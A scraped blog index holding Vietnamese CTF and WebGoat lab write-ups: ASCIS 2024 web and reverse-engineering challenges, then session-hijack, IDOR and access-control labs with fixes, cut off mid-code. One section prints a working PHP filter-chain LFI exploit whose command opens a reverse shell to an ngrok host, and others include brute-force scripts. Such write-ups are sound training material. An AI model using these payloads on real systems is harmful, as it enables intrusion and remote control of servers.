
[{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\r#\r","date":"22 October 2024","externalUrl":null,"permalink":"/posts/flare-on-11/","section":"Posts","summary":"Flare-On 11 Writeup","title":"Flare-On 11 Writeup","type":"posts"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/tags/reverse/","section":"Tags","summary":"","title":"Reverse","type":"tags"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/","section":"Shr3wd","summary":"","title":"Shr3wd","type":"page"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/authors/shr3wd/","section":"Authors","summary":"","title":"Shr3wd","type":"authors"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/categories/writeup/","section":"Categories","summary":"","title":"Writeup","type":"categories"},{"content":"❝Being the richest man in the cemetery does not matter to me … Going to bed at night saying we’ve done something wonderful … that’s what matters to me.❞\nHi, I\u0026rsquo;m Minh Tri aka shr3wd.\nI am studying Computer Science at VKU.\nIn CTF, I am a RE, PWN, Web player\nI am currently the President of VSL Information Security Club.\nIf you want to be my teammate, please contact me, I am happy to have you as my companion.\n","date":"21 October 2024","externalUrl":null,"permalink":"/about/","section":"Shr3wd","summary":"","title":"About","type":"page"},{"content":" Cyber Jutsu Web Pentest\nIssued by: Cyber Jutsu Academy\nDate: April 2023\nDescription: This certificate acknowledges that Phạm Minh Trí has successfully completed the Web Penetration Testing course, demonstrating proficiency in identifying and exploiting vulnerabilities in web applications. The course covered various essential techniques and tools used in web security.\nSignatories:\nNguyen Manh Luat, Director, Cyber Jutsu JSC Lam Minh Bao, Course Mentor ","date":"21 October 2024","externalUrl":null,"permalink":"/certificate/","section":"Shr3wd","summary":"","title":"Certificate","type":"page"},{"content":"\rLời mở đầu #\rGiải SVATTT năm nay là năm thứ 2 mình tham gia. Nhờ may mắn và cố gắng của mọi người, team mình được đánh bảng A (Attack - Defense) ở vòng Chung khảo tại MTA (Mặc dù rất thích đánh Jeopardy ở bảng B :\u0026lt;) Tuy nhiên, với khát khao được chơi Jeopardy, mình đã nhờ thành viên bảng B giữ đề để về ngâm cứu :\u0026gt; Mình sẽ cố gắng solve hết tất cả các bài (hy vọng là được ^^) Misc #\rSanity Check #\rBài này flag được đặt ở trong phần alt của ảnh được mô tả ở đề bài\nFlag: ASCIS{WishYouWillHaveAGoodDayAtASCIS2024}\nWeb #\rRootme bro #\rVới bài này, mình nghe web player bên mình bảo là cuối giờ btc mới đưa hint. Trong hint là source code, và trong source code là … flag!?? Chỉ cần đổi ASCIS thành VNISA và submit là done :\u0026gt; Tuy nhiên, khi mình phân tích source code để xem ý tưởng của tác giả thế nào thì phát hiện trong folder exam/page có một file là file_race_condition.php\n⇒ Có lẻ mục đích của tác giả là sử dụng Race Codition để upload được một file php lên hệ thống rôi sau đó RCE để đọc được flag.\nif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;) { $target_dir = \u0026#34;../uploads/\u0026#34;; $user_session = $_SESSION[\u0026#39;user_id\u0026#39;]; $target_file = $target_dir .$user_session.\u0026#39;_\u0026#39;. basename($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; // Move file to target directory without checks if (move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { // Introduce a delay (simulating a potential race condition window) //sleep(2); // Check MIME type and file type if (checkmime($target_file) \u0026amp;\u0026amp; checkFileType($target_file)) { echo \u0026#34;The file \u0026#34;. htmlspecialchars($target_file). \u0026#34; has been uploaded.\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;The file is stored in \u0026#34; . $target_file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;img src=\u0026#39;$target_file\u0026#39; alt=\u0026#39;Uploaded Image\u0026#39; style=\u0026#39;max-width: 100%; height: auto;\u0026#39;\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } else { unlink($target_file); echo \u0026#34;Sorry, there was an error uploading your file.\u0026lt;br\u0026gt;\u0026#34;; http_response_code(403); } } else { //echo \u0026#34;Sorry, there was an error moving your file.\u0026lt;br\u0026gt;\u0026#34;; } } ⇒ Qua đoạn code của tác giả thì có thể thấy được file khi upload lên sẽ luôn được move vào folder uploads của người dùng, sau đó file mới được kiểm tra mime và filetype rồi mới bị xóa đi nếu như không hợp lệ.\nQua đây, có thể sử dụng Race Codition để truy cập tới file php đang được upload lên trước khi nó bị xóa đi để có thể RCE được server.\nTrain to server #\rVới bài này thì khi đăng nhập thành công với tài khoản là admin:admin thì sẽ được đưa tới một trang có dính lỗi LFI (Local File Include) với parameter là file . Tuy nhiên, mình thử dò file flag ở một số nơi thì lại không có nên mình đoán là phải RCE nên mình đã thử dùng một số payload wrapper của PHP nhưng nó không hoạt động. Reseach trên mạng thì thấy có một bài tương tự và có sẵn payload nên mình sử dụng để RCE luôn\nimport requests url = \u0026#34;http://183.91.11.30:8889/page.php\u0026#34; file_to_use = \u0026#34;php://temp\u0026#34; command = \u0026#34;php -r \u0026#39;$sock=fsockopen(\\\u0026#34;0.tcp.ap.ngrok.io\\\u0026#34;,18336);exec(\\\u0026#34;sh \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\\\u0026#34;);\u0026#39;\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) RCE server và mình phát hiện flag nằm ở cùng thư mục và nó nằm trong Dockerfile =)))))\n⇒ Đáng ra nên fuzz bài này để tìm flag nhanh hơn :\u0026gt;\nDocMan #\rBài này được cung cấp source code.\nMình thử sử dụng trang web để xem các tính năng của nó thì phát hiện trang web cho phép upload các file pdf|word và cho phép xem hoặc tải xuống các file được upload lên. Tuy nhiên, khi reload lại trang thì đường dẫn tới các file này biến mất???\nOke, tới đây mình phân tích source code và để ý thấy ở file lib.php (Đây là file php dùng để xử lý và filter các file upload lên).\nfunction checkFileName($name) { return preg_match(\u0026#34;/\\.(docx|pdf)$/\u0026#34;, strtolower($name)); } function checkFileType($type) { return preg_match(\u0026#34;/^(application\\/vnd\\.openxmlformats\\-officedocument\\.wordprocessingml\\.document|application\\/pdf)$/\u0026#34;, strtolower($type)); } function checkFileSize($size) { return ($size \u0026gt;= 1000 \u0026amp;\u0026amp; $size \u0026lt;= 100000 ? true : false); } function checkFileMagic($fn) { $handle = fopen($fn, \u0026#39;r\u0026#39;); $magic = strtoupper(bin2hex(fread($handle, 8))); fclose($handle); return ($magic == \u0026#34;504B030414000600\u0026#34; || substr($magic, 0, 8) == \u0026#34;25504446\u0026#34;); } Check extension: extension cuối của file phải là docx hoặc pdf ⇒ Có thể chèn các extension khác vào như a.php .pdf Check File type: file type của các file phải thuộc doc hoặc pdf ⇒ Dùng burp suite hoặc các công cụ chỉnh sửa request khác có thể bypass được. Check file size: ở đây, đoạn code sẽ check size ⇒ Có thể chèn dữ liệu vào file để bypass Check file magic: ở đây đoạn code sẽ check 8 byte đầu của file có khớp với các byte mà dev lập trình sẵn hay không ⇒ Có thể bypass bằng burp ⇒ Tổng hợp lại tất cả, lúc này chỉ cần upload một file php với các lớp bypass trên thì có thể RCE được server và đọc được flag.\nReverse #\rCalculator #\rBài này được cung cấp một file ASM =\u0026gt; Hiểu logic mã asm hoặc chuyển thành một ngôn ngữ khác để dễ phân tích hơn.\nfx: push rbp mov rbp, rsp mov QWORD PTR [rbp-24], rdi mov rax, QWORD PTR [rbp-24] mov eax, DWORD PTR [rax] cmp eax, 70 # F jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 4 mov eax, DWORD PTR [rax] cmp eax, 76 # L jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 8 mov eax, DWORD PTR [rax] add eax, eax cmp eax, 130 # A jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 12 mov eax, DWORD PTR [rax] cmp eax, 71 # G jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 16 mov eax, DWORD PTR [rax] cmp eax, 123 # { jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 20 mov eax, DWORD PTR [rax] cmp eax, 95 # _ jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 24 mov eax, DWORD PTR [rax] sub eax, 75 # M cmp eax, 2 ja .L2 mov rax, QWORD PTR [rbp-24] add rax, 28 mov eax, DWORD PTR [rax] cmp eax, 48 # \u0026gt;= 0 jle .L2 mov rax, QWORD PTR [rbp-24] add rax, 32 mov eax, DWORD PTR [rax] # \u0026gt;= d cmp eax, 100 jle .L2 mov rax, QWORD PTR [rbp-24] add rax, 28 mov edx, DWORD PTR [rax] mov rax, QWORD PTR [rbp-24] add rax, 32 mov eax, DWORD PTR [rax] add eax, edx cmp eax, 152 # jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 36 mov eax, DWORD PTR [rax] cmp eax, 98 # b jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 40 mov eax, DWORD PTR [rax] test eax, eax # != 0 je .L2 mov rax, QWORD PTR [rbp-24] add rax, 44 mov eax, DWORD PTR [rax] cmp eax, 48 # 0 jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 48 mov eax, DWORD PTR [rax] cmp eax, 110 # n jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 52 mov eax, DWORD PTR [rax] cmp eax, 95 # _ jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 56 mov eax, DWORD PTR [rax] cmp eax, 83 # S jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 60 mov eax, DWORD PTR [rax] cmp eax, 104 # h jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 64 mov eax, DWORD PTR [rax] cmp eax, 49 # 1 jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 68 mov eax, DWORD PTR [rax] cmp eax, 110 # n jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 72 mov eax, DWORD PTR [rax] cmp eax, 105 # i jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 76 mov eax, DWORD PTR [rax] cmp eax, 110 # n jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 80 mov eax, DWORD PTR [rax] cmp eax, 103 # g jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 84 mov eax, DWORD PTR [rax] cmp eax, 95 # _ jne .L2 mov rax, QWORD PTR [rbp-24] add rax, 88 mov eax, DWORD PTR [rax] cmp eax, 125 # } jne .L2 mov eax, 1 jmp .L3 .L2: mov eax, 0 .L3: mov DWORD PTR [rbp-4], eax nop pop rbp ret Phân tích source bài này thì thấy rõ ràng là một bài guessing :\u0026gt; (? btc)\nFlag sẽ là: FLAG{MXXbX0n_Sh1ning} với X là các ký tự phải guessing.\n","date":"20 October 2024","externalUrl":null,"permalink":"/posts/ascis-2024-final-jeopardy/","section":"Posts","summary":"ASCIS CTF 2024 Final Writeup","title":"ASCIS 2024 (Final)","type":"posts"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/forensic/","section":"Tags","summary":"","title":"Forensic","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"\rRE #\rRev-1 #\rDùng strings để xem các chuỗi có trong file binary, flag sẽ hiển thị flag{833450aafcf1a802422ac2bf6c42a304}\nRev-2 #\r","date":"20 September 2024","externalUrl":null,"permalink":"/posts/ddc-2024/","section":"Posts","summary":"Digital Dragon CTF 2024 Qualify Writeup","title":"DDC 2024 (Qualify)","type":"posts"},{"content":"\rWebGoat #\rĐây là writeup các lab trong Webgoat (A1)Broken Access Control #\rHijack a session #\rNguyên nhân #\r// ... private static final Supplier\u0026lt;String\u0026gt; GENERATE_SESSION_ID = () -\u0026gt; ++id + \u0026#34;-\u0026#34; + Instant.now().toEpochMilli(); // ... if (StringUtils.isEmpty(authentication.getId())) { authentication.setId(GENERATE_SESSION_ID.get()); } // ... Trang web xác thực người dùng thông qua cookie hijack_cookie , tuy nhiên cách khởi tạo cookie này rất dễ đoán và có thể bruteforce để có thể chiếm phiên truy cập của người dùng khác. Cụ thể: khi một người dùng đăng nhập vào trang web, một session id sẽ được tạo ra với format: \u0026lt;id cuản người dùng cuối cùng đăng nhập + 1\u0026gt;-\u0026lt;thời gian lúc đăng nhập\u0026gt; Để chiếm quyền của người dùng khác thì chỉ cần tìm được id của người dùng đó lúc đăng nhập, sau đó bruteforce thời gian để tạo ra được session id của người dùng đó. POC #\rĐăng nhập lần đầu vào web Khi này, server sẽ response kèm với cookie hijack_cookie=7455010367430442610-1722931194741 Gửi request này sang Repeater và gửi lại (đến khi ID tăng quá 1 đơn vị): Lúc này Session ID đã tăng lên tận 2 đơn vị: 7455010367430442628 -\u0026gt; 7455010367430442630 . Có nghĩa người dùng khác đã đăng nhập và có ID là 7455010367430442629 , lúc này chỉ cần bruteforce thời gian nữa là sẽ có được cookie của người dùng đó (1722931359634 tới 1722931360694) Gửi request tới Intruder kèm cookie hijack_cookie=7455010367430442629-17229313§59634§ và tiến hành bruteforce giá trị Và tìm ra được session id của người dùng khác, hoàn thành lab\nCách khắc phục #\rThay cách tạo session id tăng tuần tự thành một cách tạo session id hoàn toàn ngẫu nhiên và khó đoán hơn\nimport java.security.SecureRandom; // ... private static final SecureRandom secureRandom = new SecureRandom(); private static final Supplier\u0026lt;String\u0026gt; GENERATE_SESSION_ID = () -\u0026gt; { byte[] randomBytes = new byte[32]; secureRandom.nextBytes(randomBytes); return Base64.getUrlEncoder().encodeToString(randomBytes) + \u0026#34;-\u0026#34; + Instant.now().toEpochMilli(); }; // ... Insecure Direct Object References #\rNguyên nhân #\rLập trình viên lập trình tính năng xem profile nhưng lại để cách xem dựa vào userid và không kiểm tra quyền (sai cách), đây là untrusted data, hacker có thể tận dụng điều này bằng cách thay đổi userid để xem được profile của người dùng khác String authUserId = (String) userSessionData.getValue(\u0026#34;idor-authenticated-user-id\u0026#34;); if (userId != null \u0026amp;\u0026amp; !userId.equals(authUserId)) { // on the right track UserProfile requestedProfile = new UserProfile(userId); // secure code would ensure there was a horizontal access control check prior to dishing up // the requested profile if (requestedProfile.getUserId() != null \u0026amp;\u0026amp; requestedProfile.getUserId().equals(\u0026#34;2342388\u0026#34;)) { return success(this) .feedback(\u0026#34;idor.view.profile.success\u0026#34;) .output(requestedProfile.profileToMap().toString()) .build(); } else { return failed(this).feedback(\u0026#34;idor.view.profile.close1\u0026#34;).build(); } } else { return failed(this).feedback(\u0026#34;idor.view.profile.close2\u0026#34;).build(); } String authUserId = (String) userSessionData.getValue(\u0026#34;idor-authenticated-user-id\u0026#34;); // this is where it starts ... accepting the user submitted ID and assuming it will be the same // as the logged in userId and not checking for proper authorization // Certain roles can sometimes edit others\u0026#39; profiles, but we shouldn\u0026#39;t just assume that and let // everyone, right? // Except that this is a vulnerable app ... so we will UserProfile currentUserProfile = new UserProfile(userId); if (userSubmittedProfile.getUserId() != null \u0026amp;\u0026amp; !userSubmittedProfile.getUserId().equals(authUserId)) { // ... POC #\rỞ phần 2 và 3, khi đăng nhập tài khoản tom:cat thì khi nhấn vào view profile để xem thông tin thì có một request được gửi đi /profile với response trả về như hình\nSử dụng url này kèm với userId: …/profile/{userId} thì có được một response như sau\nFeedback trả về nói là đã đúng đường dẫn nhưng cần thử một userId khác, lúc này chỉ cần viết một script nhỏ để bruteforce userId hợp lệ (hoặc dùng Intruder của Burp Suite)\nimport requests URL = \u0026#34;http://localhost:8080/WebGoat/IDOR/profile/\u0026#34; headers = { \u0026#39;Cookie\u0026#39;: \u0026#39;JSESSIONID={your session id}\u0026#39; } id = 2342384 while True: r = requests.get(URL + str(id), headers=headers) json = r.json() lessonCompleted = json[\u0026#34;lessonCompleted\u0026#34;] if lessonCompleted == True: print(\u0026#34;[+] ID found: \u0026#34; + str(id)) break else: id += 1 print(\u0026#34;[-] Trying ID: \u0026#34; + str(id)) PS C:\u0026gt;Users/Admin/Desktop\u0026gt; python -u \u0026#34;d:\\VNPT\\projects\\WebGoat\\Payload\\bruteforce-id.py\u0026#34; [-] Trying ID: 2342385 [-] Trying ID: 2342386 [-] Trying ID: 2342387 [-] Trying ID: 2342388 [+] ID found: 2342388 Vậy userId cần hợp lệ là 2342388, truy cập đường dẫn http://localhost:8080/WebGoat/IDOR/profile/2342388 sẽ pass được phần View Another Profile của lab này.\nTiếp theo đổi method thành PUT và Content-Type thành Content-Type: application/json và body:\n{\u0026#34;role\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;color\u0026#34;:\u0026#34;red\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;large\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Buffalo Bill\u0026#34;, \u0026#34;userId\u0026#34;:\u0026#34;2342388\u0026#34;} Gửi request:\nCách khắc phục #\rKiểm tra xem người dùng thực hiện yêu cầu có quyền hạn không, nếu là quản lý hoặc là người dùng sở hữu hợp lệ thì mới cho phép thực hiện request:\n// IDORViewOtherProfile // ... String authUserId = (String) userSessionData.getValue(\u0026#34;idor-authenticated-user-id\u0026#34;); if (userId != null \u0026amp;\u0026amp; userId.equals(authUserId)) { UserProfile requestedProfile = new UserProfile(userId); if (requestedProfile.getUserId() != null \u0026amp;\u0026amp; userHasPermission(authUserId, requestedProfile)) { return success(this) .feedback(\u0026#34;idor.view.profile.success\u0026#34;) .output(requestedProfile.profileToMap().toString()) .build(); } else { return failed(this).feedback(\u0026#34;idor.view.profile.unauthorized\u0026#34;).build(); } } else { return failed(this).feedback(\u0026#34;idor.view.profile.invalid\u0026#34;).build(); } // ... private boolean userHasPermission(String authUserId, UserProfile requestedProfile) { return authUserId.equals(requestedProfile.getUserId()); } // ... // IDOREditOtherProfile // ... UserProfile currentUserProfile = new UserProfile(userId); if (userSubmittedProfile.getUserId() != null \u0026amp;\u0026amp; userSubmittedProfile.getUserId().equals(authUserId) \u0026amp;\u0026amp; currentUserProfile.getUserId().equals(authUserId)) { // ... Missing Function Level Access Control #\rNguyên nhân lỗi #\rLập trình viên để phía front-end các đoạn code, thông tin nhạy cảm, và đồng thời không xác thực quyền truy cập vào các đường dẫn nhạy cảm khiến cho hacker có thể truy cập và xem được các thông tin này.\n\u0026lt;li class=\u0026#34;hidden-menu-item dropdown\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;dropdown-toggle\u0026#34; data-toggle=\u0026#34;dropdown\u0026#34; role=\u0026#34;button\u0026#34; aria-haspopup=\u0026#34;true\u0026#34; aria-expanded=\u0026#34;false\u0026#34;\u0026gt;Admin\u0026lt;span class=\u0026#34;caret\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026#34;dropdown-menu\u0026#34; aria-labelledby=\u0026#34;admin\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/access-control/users\u0026#34;\u0026gt;Users\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/access-control/users-admin-fix\u0026#34;\u0026gt;Users\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/access-control/config\u0026#34;\u0026gt;Config\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; Người dùng có thể tạo tài khoản và đặt quyền admin của mình thoải mái → Người dùng có thể tạo tài khoản admin và sử dụng các tính năng của admin.\n@PostMapping( path = {\u0026#34;access-control/users\u0026#34;, \u0026#34;access-control/users-admin-fix\u0026#34;}, consumes = \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) @ResponseBody public User addUser(@RequestBody User newUser) { try { userRepository.save(newUser); return newUser; } catch (Exception ex) { log.error(\u0026#34;Error creating new User\u0026#34;, ex); return null; } // @RequestMapping(path = {\u0026#34;user/{username}\u0026#34;,\u0026#34;/\u0026#34;}, method = RequestMethod.DELETE, consumes = // \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) // TODO implement delete method with id param and authorization } POC #\rTừ đoạn mã html bị ẩn đi, thu thập thêm được 3 đường dẫn là /access-control/users, /access-control/users-admin-fix, /access-control/config\nTrong code thì chỉ có 2 đường dẫn /users và /users-admin-fix là hợp lệ, và hai đường dẫn này yêu cầu Content-Type là application/json\n@GetMapping( path = {\u0026#34;access-control/users-admin-fix\u0026#34;}, consumes = \u0026#34;application/json\u0026#34;) // ... @GetMapping( path = {\u0026#34;access-control/users\u0026#34;}, consumes = \u0026#34;application/json\u0026#34;) // ... Request đến 2 đường dẫn này (Bổ sung Content-Type: application/json vào header)\nResponse từ đường dẫn /users\nResponse từ đường dẫn /users-admin-fix\nResponse trả về từ đường dẫn /users trả về một json danh sách các user gồm 3 data fields: username, admin, userHash . → Dựa vào đây có thể tìm được mã hash của tài khoản Jerry là: SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=\nCòn response trả về từ /users-admin-fix thì trả về status code là 403 forbidden. Nguyên nhân là do trong logic code xử lý request, dev đã kiểm tra currentUser có phải là admin hay không thì mới cho sử dụng tính năng này.\nĐể lấy được mã hash mới của tài khoản Jerry, chúng ta có 2 cách:\nSử dụng đường dẫn /users hoặc /users-admin-fixed bằng phương thức POST để thêm một user mới với quyền admin. Phân tích cách tạo ra mã hash của chương trình và tạo lại mã này. Thêm một user mới với quyền admin @PostMapping( path = {\u0026#34;access-control/users\u0026#34;, \u0026#34;access-control/users-admin-fix\u0026#34;}, consumes = \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) @ResponseBody public User addUser(@RequestBody User newUser) { try { userRepository.save(newUser); return newUser; } catch (Exception ex) { log.error(\u0026#34;Error creating new User\u0026#34;, ex); return null; } // @RequestMapping(path = {\u0026#34;user/{username}\u0026#34;,\u0026#34;/\u0026#34;}, method = RequestMethod.DELETE, consumes = // \u0026#34;application/json\u0026#34;, produces = \u0026#34;application/json\u0026#34;) // TODO implement delete method with id param and authorization } Vậy là lúc này có thể đăng nhập tài khoản có quyền admin mới này, sau đó request đến /users-admin-fixed\nTuy nhiên cách này ở đây không khả dụng vì không có tính năng đăng nhập để có thể sử dụng.\nTạo lại mã Hash Đầu tiên cần phải xem cách tạo mã Hash, dev code một hàm DisplayUser(user, \u0026lt;SALT code\u0026gt;) để hiển thị thông tin user với password đã bị hash với salt được truyền vào. Ở đây có hai salt được tìm thấy trong mã nguồn là public static final String PASSWORD_SALT_SIMPLE = \u0026#34;DeliberatelyInsecure1234\u0026#34;; public static final String PASSWORD_SALT_ADMIN = \u0026#34;DeliberatelyInsecure1235\u0026#34;; Đoạn code của hàm DisplayUser @Getter public class DisplayUser { // intended to provide a display version of WebGoatUser for admins to view user attributes private String username; private boolean admin; private String userHash; public DisplayUser(User user, String passwordSalt) { this.username = user.getUsername(); this.admin = user.isAdmin(); try { this.userHash = genUserHash(user.getUsername(), user.getPassword(), passwordSalt); } catch (Exception ex) { this.userHash = \u0026#34;Error generating user hash\u0026#34;; } } protected String genUserHash(String username, String password, String passwordSalt) throws Exception { MessageDigest md = MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;); // salting is good, but static \u0026amp; too predictable ... short too for a salt String salted = password + passwordSalt + username; // md.update(salted.getBytes(\u0026#34;UTF-8\u0026#34;)); // Change this to \u0026#34;UTF-16\u0026#34; if needed byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8)); return Base64.getEncoder().encodeToString(hash); } } Ban đầu, dev sử dụng salt là PASSWORD_SALT_SIMPLE , nhưng đối với /users-admin-fixed thì sử dụng mã salt là PASSWORD_SALT_ADMIN . Trong mã nguồn, tìm thấy được password gốc của tài khoản Jerry là doesnotreallymatter Code lại hàm tạo này và chạy để lấy được mã hash mới của Jerry import java.nio.charset.StandardCharsets; import java.security.MessageDigest; import java.util.Base64; class HashJerry { public static void main(String[] args) throws Exception { String username = \u0026#34;Jerry\u0026#34;; String password = \u0026#34;doesnotreallymatter\u0026#34;; String PASSWORD_SALT_ADMIN = \u0026#34;DeliberatelyInsecure1235\u0026#34;; String hash = genUserHash(username, password, PASSWORD_SALT_ADMIN); System.out.println(hash); } private static String genUserHash(String username, String password, String passwordSalt) throws Exception { 